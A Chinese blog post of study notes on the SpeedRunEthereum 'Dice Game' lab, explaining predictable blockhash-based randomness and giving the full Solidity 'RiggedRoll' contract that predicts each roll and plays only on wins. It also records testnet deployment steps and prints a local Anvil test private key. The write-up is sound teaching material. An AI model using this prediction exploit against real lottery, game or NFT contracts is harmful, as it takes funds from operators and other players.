---
title: "SpeedRunEthereum 靶场学习笔记 03：Dice Game"
date: 2026-06-24 09:00:00
updated: 2026-06-25 09:00:00
categories:
  - "区块链开发"
  - "SpeedRunEthereum"
tags:
  - "SpeedRunEthereum"
  - "Solidity"
  - "Foundry"
  - "Scaffold-ETH 2"
  - "合约安全"
  - "链上随机数"
abbrlink: "speedrunethereum-dice-game"
---
> 这是我的 SpeedRunEthereum 靶场个人学习笔记。第 3 关 Dice Game 聚焦可预测的链上随机数、同交易攻击、ETH 接收、Ownable 权限控制，以及从本地测试到 Sepolia 和 Vercel 的完整部署流程。

> **Challenge**: [speedrunethereum.com/challenge/dice-game](https://speedrunethereum.com/challenge/dice-game)
> **状态**: ✅ ACCEPTED（Ethereum 101 · 5/5；8/8 本地测试、Sepolia 部署、Etherscan 验证、Vercel 上线和靶场提交均已完成）
> **框架**: Foundry
> **日期**: 2026/06/24
> **XP**: +10（Ethereum 101 · 5/5）

---

## 🚀 部署信息（我的 Sepolia 上线）

| 项目 | 值 |
|------|-----|
| **DiceGame** | `0x452a44a69a831D6EeeA1a890Cb35dbEE46B4d8aF` |
| **RiggedRoll** | `0xD231ba0a1FbD4A4A459a1B4A46BA6383Ae5D0Bc8` |
| **Deployer 账户** | `0x6d1cD1d9F7226De5af18a7f9fD64E3aA6e81ca04`（`kylinxin` keystore） |
| **Vercel 生产** | https://dicegame-o88gj1h72-spacex3.vercel.app |
| **Vercel 别名** | https://dicegame-ky.vercel.app |
| **Vercel 项目** | `spacex3/dicegame-ky` |
| **网络** | Sepolia（chain id 11155111） |
| **部署区块** | 11128616 |

### 部署交易

| 合约 | Tx Hash | Gas | 费用 |
|------|---------|-----|------|
| **DiceGame** | `0x1abec1c633e03d0d9524f70111219dd3a52af936fc7a9ac0024c69ca47868604` | 272,763 | 0.000293829 ETH |
| **RiggedRoll** | `0x0803646835d3c9b0f02540baac1ca315349ff7cd1d44a349e94f15a504f4b91c` | 395,764 | 0.000426329 ETH |
| **总计** | — | 668,527 | **0.000720159 ETH** |

### 部署时实际命令

```bash
yarn deploy --network sepolia
# 选择 #2 = kylinxin keystore，输入密码
# 编译（No files changed, compilation skipped）
# 自动脚本：构造 + 部署 + 广播
```

> 部署走 `DeployDiceGame.s.sol`，会自动：
> 1. `new DiceGame{ value: 0.05 ether }()` 部署 + 注资
> 2. `new RiggedRoll(payable(address(diceGame)))` 部署 RiggedRoll
> 3. 按部署脚本完成 `RiggedRoll` 所有权设置

### Etherscan 链接

- DiceGame: https://sepolia.etherscan.io/address/0x452a44a69a831D6EeeA1a890Cb35dbEE46B4d8aF
- RiggedRoll: https://sepolia.etherscan.io/address/0xD231ba0a1FbD4A4A459a1B4A46BA6383Ae5D0Bc8
- Deploy Tx 1 (DiceGame): https://sepolia.etherscan.io/tx/0x1abec1c633e03d0d9524f70111219dd3a52af936fc7a9ac0024c69ca47868604
- Deploy Tx 2 (RiggedRoll): https://sepolia.etherscan.io/tx/0x0803646835d3c9b0f02540baac1ca315349ff7cd1d44a349e94f15a504f4b91c

### Vercel 部署

```bash
yarn vercel --prod
# 设置和部署确认：是
# 范围：zz
# 链接到已有项目：否（创建新项目）
# 项目名：dicegame-ky
# 代码目录：./
# 修改项目设置：否
# ✅ Production: https://dicegame-o88gj1h72-spacex3.vercel.app
# 🔗 Aliased: https://dicegame-ky.vercel.app
```

> 线上配置已将 `packages/nextjs/scaffold.config.ts` 的 `targetNetwork` 设为 `chains.sepolia`，Vercel 前端连接 Sepolia。

---

## 📋 项目总览

链上掷骰子游戏 + **攻击者合约**。`DiceGame` 是"庄家"（出题人提供，DO NOT EDIT），我们要写一个 `RiggedRoll` 来**预测随机数**、**只赢才掷**。

### 教学价值（这个挑战想让你懂的）

1. **合约怎么收 ETH** —— `receive() external payable`
2. **同交易攻击**（same-tx attack）—— 合约内同步读取的公开链上数据不能充当不可预测随机源
3. **`Ownable` 访问控制** —— 谁能动钱，谁不能动
4. **`call{value: ...}`** 转账及其返回值检查
5. **为什么不能用 `blockhash` 做随机** —— NFT 公平 mint / DeFi 清算 / 抽奖全踩过这个坑

> **关键洞察**：本题使用的上一块 `blockhash`、合约地址和公开 `nonce` 都能被攻击合约在调用前复算。同理，`block.prevrandao`、`block.timestamp` 等当前交易可读数据也不能单独作为安全随机源；需要使用 [Chainlink VRF](https://docs.chain.link/vrf)、commit-reveal 等方案引入不可预先获知的信息。

---

## 🎲 游戏规则

`DiceGame` 合约（`packages/foundry/contracts/DiceGame.sol`）：

- 玩家每次必须付 **0.002 ETH** 才能掷一次
- 合约掷出 **0–15** 的"随机数"
- **点数 ≤ 5**（6/16 ≈ 37.5% 胜率）→ **玩家赢**
- 否则 → 玩家输，钱归合约

### 钱怎么分

每次 0.002 ETH 拆成：

| 比例 | 金额 | 去向 |
|------|------|------|
| 40% | 0.0008 ETH | 滚入**奖池**（给未来赢家） |
| 60% | 0.0012 ETH | **庄家抽水**，永远留在合约里 |

### 赢的瞬间

- 赢家**一次性拿走整个当前奖池**
- 奖池**重置**为「合约余额的 10%」（庄家把之前抽的水又压回去）
- 发起新一局，奖池重新积累

---

## 🐛 漏洞在哪里

DiceGame 算"随机数"的方式：

```solidity
bytes32 prevHash = blockhash(block.number - 1);
bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
uint256 roll = uint256(hash) % 16;
```

看起来随机，但**三个输入全是公开的**：

- `blockhash(block.number - 1)` —— 任何人都能读
- `address(this)` —— 合约地址，公开
- `nonce` —— 公开的 state variable

所以**另一个合约可以在同一笔交易里"算一遍"** DiceGame 会算出的数。**只在自己必胜的时候才付 0.002 ETH 去掷**。

> 这就是"庄家模式" —— 知道自己掷出啥，> 5 就 revert，≤ 5 才花那 0.002 ETH。

---

## 📜 最终合约代码（`RiggedRoll.sol`）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////
    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 required, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////
    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////
    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    // Checkpoint 2: 预测 + 只赢才掷
    function riggedRoll() external {
        uint256 required = 0.002 ether;
        if (address(this).balance < required) {
            revert NotEnoughETH(required, address(this).balance);
        }

        // 复刻 DiceGame 的随机数计算
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        diceGame.rollTheDice{value: required}();
    }

    // Checkpoint 1: 接收 ETH
    receive() external payable {
        // This function is called when the contract receives Ether
    }

    // Checkpoint 3: 提现
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        if (address(this).balance < _amount) {
            revert InsufficientBalance(_amount, address(this).balance);
        }
        // 用 call 把 _amount 发给 _addr
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Transfer failed.");
    }
}
```

### 💡 几个值得记的小细节

- **`receive()` 没有 `function` 关键字** —— 它是 Solidity 的特殊函数
- **`_addr.call{value: _amount}("")` 走的是 `address` 类型**，不需要先转 `payable(address)`
- **`Ownable(msg.sender)` 在构造时把 deployer 设为初始 owner**
- **错误参数名和 interface 不一致也无所谓** —— Solidity 自定义错误的 selector 只看名字，不看参数名

---

## 🎓 教学流程回顾

### Checkpoint 1：Receiving ETH（`receive()`）

**问题**：如果 RiggedRoll 没有 `receive()`，DiceGame 发奖时会发生什么？

**答**：DiceGame 向 RiggedRoll 发放奖金时会触发裸 ETH 转账；如果没有 `receive() external payable`，收款会 revert，整笔中奖交易也会失败。

**验证结论**：✅ `receive()`、裸 ETH 转账与 revert 传播关系均已确认。

**关键概念**：
- 合约默认**收不到 ETH**
- `receive() external payable {}` 是接收"裸 ETH"（无 calldata）的入口
- 没有 `receive()` 时，**转账会 revert**，整笔交易失败

---

### Checkpoint 2：Predicting Randomness（`riggedRoll()`）

**问题**：为什么 RiggedRoll 能预测 DiceGame 的"随机"数？

**答（教学版）**：
- 同一笔交易 / 同一区块，三个输入（`blockhash`、`address`、`nonce`）**全是公开的**
- 在调用 `rollTheDice()` **之前**就能算出 roll 值
- ≤ 5 才掷，> 5 直接 revert，省 0.002 ETH

**代码逻辑顺序**：
1. 余额检查 → `NotEnoughETH`
2. 复刻哈希计算
3. `roll > 5` → `NotWinningRoll`
4. `diceGame.rollTheDice{value: required}()`

---

### Checkpoint 3：Withdrawing Funds（`withdraw()`）

**问题**：为什么 `withdraw()` 必须有 `onlyOwner`？

**答**：没有的话任何人都能调，钱会被抽光（drain）

**实现细节**：
- 余额检查用自定义错误 `InsufficientBalance`（更省 gas + 信息更丰富）
- 用 `_addr.call{value: _amount}("")` 而不是 `.transfer()`（后者只转发 2300 gas，会让合约钱包卡住）
- 必须 `require(success, ...)` 检查返回值

---

## 📊 资金会计模型（4 玩家例子）

合约部署时 `constructor() payable` 注资 **0.05 ETH**。
`resetPrize()` 在 constructor 里执行一次，初始 `prize = 0.05 * 10% = 0.005 ETH`。

| 阶段 | 操作 | 合约余额 | 奖池 (prize) | 备注 |
|------|------|---------|-------------|------|
| 初始 | — | 0.05 | 0.005 | constructor 注资 + resetPrize |
| Roll 1 | Alice 付 0.002，掷 11（**输**） | 0.052 | 0.0058 | prize += 0.0008，return |
| Roll 2 | Bob 付 0.002，掷 9（**输**） | 0.054 | 0.0066 | 同上 |
| Roll 3 | Charlie 付 0.002，掷 3（**赢**） | 0.056 → 0.0486 | 0.0074 → 0.00486 | 发奖后 resetPrize = 0.0486 × 10% |
| Roll 4 | Dave 付 0.002，掷 8（**输**） | 0.0506 | 0.00566 | 新一局开始累积 |

### 关键洞察

1. **奖池 ≠ 合约余额** —— 合约余额 = 奖池 + 累计庄家抽水 + 初始注资
2. **赢的人拿走的是「更新后的 prize」** —— 自己的 40% 也算进去了
3. **`resetPrize()` 公式**：`prize = address(this).balance * 10%`，所以**重置后立刻变小**（因为刚发完奖，余额缩水）
4. **越晚赢越赚** —— 奖池会随着输家持续投入而膨胀

### 算式

```
每次 roll:
  msg.value = 0.002 ETH
  prize_delta = 0.002 × 40% = 0.0008 ETH
  house_delta = 0.002 × 60% = 0.0012 ETH
  contract_balance_delta = 0.002 ETH

赢了:
  发奖 amount = prize
  contract_balance -= amount
  prize = contract_balance × 10%   ← resetPrize
```

---

## 🧪 本地端到端测试流程（实战）

### 准备阶段

#### ⚠️ 调整 A：前端启用 "Rigged Roll!" 按钮

`packages/nextjs/app/dice/page.tsx` 第 153–170 行的 `<button>` 默认被 `{/* ... */}` 注释。解开它：

```tsx
{/* 改之前 */}
{/* <button onClick={...}>Rigged Roll!</button> */}

{/* 改之后 */}
<button
  onClick={async () => {
    ...
    await writeRiggedRollAsync({ functionName: "riggedRoll" });
    ...
  }}
  className="mt-2 btn btn-secondary btn-xl normal-case font-xl text-lg"
>
  Rigged Roll!
</button>
```

#### ⚠️ 调整 B：部署脚本把 owner 转给前端地址

`packages/foundry/script/DeployDiceGame.s.sol` 默认 owner 是 Anvil deployer（不是浏览器钱包）。改完才能用前端调 `withdraw`：

```solidity
// Uncomment to deploy RiggedRoll contract
RiggedRoll riggedRoll = new RiggedRoll(payable(address(diceGame)));
// console.logString(string.concat("RiggedRoll deployed at: ", vm.toString(address(riggedRoll))));

// 把 owner 转给前端钱包
riggedRoll.transferOwnership(0x7FB24f7c6BE7fE61dA353E2A0fE38b310aE71f17);
```

> 替换成你自己的前端钱包地址（连上 MetaMask 后右上角能看到）。

### 启动三个终端

| 终端 | 命令 | 说明 |
|------|------|------|
| A | `yarn chain` | 本地 Anvil 链（:8545） |
| B | `yarn deploy --reset` | 重新部署 |
| C | `yarn start` | Next.js 前端（:3000） |

### 浏览器演练

1. 打开 http://localhost:3000 → 连接 MetaMask
2. 左下角 **Faucet** 给自己充点 ETH
3. **手动 roll 几次** `Roll the dice!` —— 让奖池涨起来
4. **给 RiggedRoll 充钱**：用 MetaMask Send 0.01 ETH 给 RiggedRoll 地址
5. 点 **"Rigged Roll!"**：
   - 预测到 > 5 → MetaMask 里**直接 Failed**，0.002 ETH 不动
   - 预测到 ≤ 5 → 成功，拿走当前奖池
6. 切到 Debug Contracts 调 `withdraw(我的地址, 余额)` 提现

---

## 🐞 实战中踩过的坑（**重要**）

### 坑 1：Debug Contracts 看不到 `receive()`

**现象**：在 `RiggedRoll` 的 Write 方法列表里没有 `receive()`

**原因**：`receive()` 是 Solidity 特殊函数，**不通过函数选择器触发**，Debug UI 只列可主动调用的方法

**解决**：直接用 MetaMask Send ETH 给合约地址，或 `cast send` 低层调用

![Debug Contracts 页面，RiggedRoll 没有 receive 函数](/images/speedrunethereum/03-dicegame-01-debug-no-receive.png)

### 坑 2：调 `withdraw` 报 `OwnableUnauthorizedAccount`

**现象**：
```
The contract function "withdraw" reverted with the following reason:
OwnableUnauthorizedAccount(0x7FB24f7c6BE7fE61dA353E2A0fE38b310aE71f17)
```

**原因**：前端钱包 `0x7FB2...7f17` 不是 owner。owner 是 Anvil deployer `0xa0Ee...7F17`（部署脚本默认账户）

**两条解决路**：
- **A（推荐）**：从 deployer 调 `transferOwnership(0x7FB2...7f17)`，把 owner 转给前端
- **B**：从 deployer 直接调 `withdraw`（不需要改 owner，但每次都要切到 deployer 账户）

![withdraw 失败的截图](/images/speedrunethereum/03-dicegame-02-withdraw-unauthorized.png)

### 坑 3：dApp 顶部连接的地址 ≠ MetaMask 账户

**现象**：
- dApp 顶部显示 `0xf39F...2286`（Anvil index 0）
- MetaMask 切到了 `0xa0Ee...7F17`（deployer）
- 调任何交易都是从 `0xf39F...2286` 发起 → 失败

**原因**：dApp 缓存了上次的连接，没跟着 MetaMask 切换

**解决**：
1. dApp 顶部点连接按钮 → **Disconnect**
2. 重新 **Connect Wallet**
3. MetaMask 弹窗里**选择正确的账户**（这次是 `0xa0Ee...7F17`）
4. 确认后 dApp 顶部才会更新

> ⚠️ 还有一个更隐蔽的信号：MetaMask 右下角 "localhost:3000 / Not connected" —— 如果显示 "Not connected"，说明根本没连上

![dApp 显示 0xf39F 但 MetaMask 是 0xa0Ee](/images/speedrunethereum/03-dicegame-04-dapp-metamask-mismatch.png)

### 坑 4：导入 Anvil deployer 私钥到 MetaMask

**私钥**（来自 `packages/foundry/Makefile` 的 `setup-anvil-wallet`）：
```
0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6
```

**对应地址**：`0xa0Ee66B62968fAd9D267Ae52d8a116D71f5C7F17`（Anvil index 9）

> ⚠️ **这只是本地 Anvil 测试链的私钥**，**永远不要**在主网或存有真实资产的账户上用这个私钥！

### 坑 5：用 `0xa0Ee` 调 `transferOwnership` 给自己，还是失败

**现象**：从 deployer 调 `transferOwnership(0x7FB2)` 报错 `OwnableUnauthorizedAccount(0xa0Ee...)`

**原因**：`transferOwnership` 自己也有 `onlyOwner` 保护，必须**当前 owner**（也是 deployer）才能调。看起来"我给自己转"语义怪，但代码就是要 owner 才能改 owner

**解决**：从 `0xa0Ee` 调 `transferOwnership(0x7FB2)` 是**对的**，错的是发起的账户不是 `0xa0Ee`（参见坑 3）

![transferOwnership 失败的截图](/images/speedrunethereum/03-dicegame-03-transfer-ownership-fail.png)

### 坑 6：调 `riggedRoll` 反复是同一个数字（如 13）

**现象**：连点几下 `riggedRoll` Send，每次都 `NotWinningRoll(13)`

**原因**：`riggedRoll` 算的是 `blockhash(block.number - 1)`，**只有新区块才变**。空区块 / 同区块连点 → 输入没变 → 输出永远是 13

**解决**（任选一）：
- **方法 1（推荐）**：先点 "Roll the dice!" 输一次 → 新区块 + nonce++ → 下次 riggedRoll 就是新数
- **方法 2**：等几秒，等 Anvil 自己挖新区块
- **方法 3**：用 Debug Contracts 在 DiceGame 上调一次 `rollTheDice`

> 看到 `NotWinningRoll(13)` **不要慌**——这是合约在**主动放弃**会输的掷骰，保护你的 0.002 ETH

![riggedRoll 反复 NotWinningRoll(13)](/images/speedrunethereum/03-dicegame-07-not-winning-roll-13.png)

### 坑 7：roll 7 没有 revert

**现象**：用 "Roll the dice!" 按钮掷出 7（> 5），交易**正常 confirm** 没有 revert

**原因**：这个按钮调的是 `DiceGame.rollTheDice()` **直接调用**，没有预测逻辑。输赢都正常扣钱

> **关键区分**：
> - **"Roll the dice!"** → 普通玩家模式，输赢都扣钱，不 revert
> - **"Rigged Roll!"** → 庄家模式，预测会输就 revert

![普通 Roll the dice 按钮掷出 7，没 revert](/images/speedrunethereum/03-dicegame-06-roll-7-no-revert.png)

### 坑 8：`withdraw` 提完钱后 `riggedRoll` 报错 `NotEnoughETH`

**现象**：提完 1.002 ETH 后再点 `riggedRoll` → `revert NotEnoughETH(0.002 ether, 0)`

**原因**：合约余额 = 0，没钱支付 roll 费

**解决**：用 MetaMask Send 0.01 ETH 给 RiggedRoll 充钱再试

---

## ✅ 成功截图：transferOwnership + withdraw 全部 Confirmed

![](/images/speedrunethereum/03-dicegame-05-success.png)

- ✅ `owner` 字段 = dApp 顶部的 `0xa0Ee...9720`
- ✅ RiggedRoll Balance = `0.0000 ETH`（钱全提走）
- ✅ MetaMask Activity 里 `Withdraw` + `Transfer Ownership` 都 Confirmed

---

## 🧪 测试结果

```bash
$ yarn test
Ran 8 tests for test/RiggedRoll.t.sol:RiggedRollTest
[PASS] test_Checkpoint1_ShouldAcceptETHTransfers() (gas: 5651)
[PASS] test_Checkpoint2_ShouldCallRollTheDiceForWinningRoll() (gas: 66238)
[PASS] test_Checkpoint2_ShouldDeployContracts() (gas: 9984)
[PASS] test_Checkpoint2_ShouldNotCallRollTheDiceForLosingRoll() (gas: 63245)
[PASS] test_Checkpoint2_ShouldRevertIfBalanceLessThanRollAmount() (gas: 8653)
[PASS] test_Checkpoint2_ShouldTransferSufficientETH() (gas: 5673)
[PASS] test_Checkpoint3_ShouldRevertWithdrawWhenAmountExceedsBalance() (gas: 12130)
[PASS] test_Checkpoint3_ShouldWithdrawFunds() (gas: 21062)
Suite result: ok. 8 passed; 0 failed; 0 skipped
```

---

## 🪞 反思 & 进阶思考

### 1. 为什么 `blockhash` 不安全？（深度）

在 EVM 里：
- `block.number` 是**确定**的（当前块号）
- `blockhash(block.number - 1)` 是**最近 256 个块**之一
- 一个区块一旦产出，`blockhash` 就**永远不变**
- 在**同一笔交易**里，`block.number` 是定值 → `blockhash` 是定值

所以**任何同区块的合约都能算出**你的"随机数"。这是 EVM **同步性**带来的根本限制。

### 2. 生产环境怎么做随机？

| 方案 | 原理 | 代表 |
|------|------|------|
| **Chainlink VRF** | 链下 oracle 生成 + 链上验证（密码学证明） | [chain.link/vrf](https://docs.chain.link/vrf) |
| **Commit-Reveal** | 玩家先提交 hash → 后揭示原数 → 防止同区块偷窥 | Kleros 陪审员抽选 |
| **RANDAO** | 用验证者的 BLS 签名做种 | 以太坊 PoS beacon chain |
| **API3 QRNG** | 量子随机数 + 链上验证 | API3 |

### 3. 攻击成立的边界

RiggedRoll 的关键不是抢跑，而是在同一笔交易中先复算、后调用。只要 DiceGame 与攻击合约使用相同的 `blockhash`、目标地址和 `nonce`，预测结果就一致；新区块或 `nonce` 变化后必须重新计算。这个边界也解释了为什么失败预测会直接 revert，而不是继续支付 0.002 ETH。

### 4. 当前实现的设计边界

本次实现严格遵循挑战接口：`riggedRoll()` 使用合约已有余额支付 roll 费，`withdraw(address,uint256)` 由 `onlyOwner` 保护并支持按金额提现。没有额外加入 `payable` 入口或 `emergencyWithdraw`，避免改变题目要求的调用方式和测试接口。

---

## 📚 真实系统中的同类风险

| 场景 | 不安全做法 | 可能后果 |
|------|------|------|
| NFT 随机铸造 | 用 `blockhash`、区块号或时间戳决定稀有度 | 铸造结果可被模拟和选择 |
| 链上抽奖 | 用公开链上变量直接计算中奖号码 | 攻击合约只在中奖时参与 |
| DeFi 排序敏感逻辑 | 把交易顺序或当前区块数据当作不可操纵输入 | 搜索者或区块构建者可利用排序获利 |

> **经验法则**：**永远不要**用任何链上数据（`blockhash`、`block.timestamp`、`block.prevrandao`、`difficulty`）做随机源。能被同区块合约算出来的东西就不是"随机"。

---

## 🎯 部署与提交完成记录

- ✅ 部署到 Sepolia：`yarn deploy --network sepolia`（已上链，见上方部署信息）
- ✅ Vercel 部署：`yarn vercel --prod`（生产 URL: https://dicegame-ky.vercel.app）
- ✅ `scaffold.config.ts` 的 `targetNetwork` 已切换为 `chains.sepolia`，线上前端连接 Sepolia
- ✅ 已通过 `yarn verify --network sepolia` 完成 Etherscan 源码验证
- ✅ 完成验证后已提交到 https://speedrunethereum.com/challenge/dice-game 并通过

---

## 💭 教学过程小记

这个挑战用的是 **AI 引导式学习**（`/start` skill 加载），流程是：

1. **教 → 问 → 写代码 → 跑测试** 循环
2. 概念 checkpoint（带 `questions`）→ 先讲明白 → 回答问题 → 才开始写
3. 代码 checkpoint（带 `task`）→ 讲清楚 → 用户写 → `check` 跑测试
4. 进度保存在 `.challenge-ai/progress.json`，可以 `/start` 恢复

这种模式比直接给答案更扎实 —— 我必须**先理解概念**才能继续。

按从第 0 关开始计数，Dice Game 是 Ethereum 101 的第 3 关，也是本阶段第 4 个、最后一个挑战；Tokenization、Crowdfunding、Token Vendor 与 Dice Game 均已完成。这个挑战的**核心考点**是「`blockhash` 不可用作随机源」+ 「`receive()` + `Ownable` 实战」+ 「**怎么思考可预测性**」。
